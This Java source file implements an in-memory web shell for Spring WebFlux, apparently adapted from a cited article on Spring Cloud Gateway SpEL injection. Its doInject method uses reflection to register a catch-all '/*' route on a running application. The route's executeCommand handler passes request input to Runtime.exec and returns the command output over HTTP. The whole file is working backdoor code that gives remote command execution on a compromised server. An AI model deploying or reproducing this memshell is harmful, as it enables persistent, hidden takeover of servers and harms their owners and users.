import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;
import org.springframework.web.reactive.result.condition.PatternsRequestCondition;
import org.springframework.web.reactive.result.method.RequestMappingInfo;
import org.springframework.web.util.pattern.PathPattern;
import org.springframework.web.util.pattern.PathPatternParser;

import java.io.IOException;
import java.lang.reflect.Method;
import java.util.Scanner;

/**
 * from https://gv7.me/articles/2022/the-spring-cloud-gateway-inject-memshell-through-spel-expressions/
 */
public class SpringRequestMappingMemshell {
    public static String doInject(Object requestMappingHandlerMapping) {
        String msg = "inject-start";
        try {
            Method registerHandlerMethod = requestMappingHandlerMapping.getClass().getDeclaredMethod("registerHandlerMethod", Object.class, Method.class, RequestMappingInfo.class);
            registerHandlerMethod.setAccessible(true);
            Method executeCommand = SpringRequestMappingMemshell.class.getDeclaredMethod("executeCommand", String.class);
            PathPattern pathPattern = new PathPatternParser().parse("/*");
            PatternsRequestCondition patternsRequestCondition = new PatternsRequestCondition(pathPattern);
            RequestMappingInfo requestMappingInfo = new RequestMappingInfo("", patternsRequestCondition, null, null, null, null, null, null);
            registerHandlerMethod.invoke(requestMappingHandlerMapping, new SpringRequestMappingMemshell(), executeCommand, requestMappingInfo);
            msg = "inject-success";
        }catch (Exception e){
            msg = "inject-error";
        }
        return msg;
    }

    public ResponseEntity executeCommand(String cmd) throws IOException {
        String execResult = new Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A").next();
        return new ResponseEntity(execResult, HttpStatus.OK);
    }
}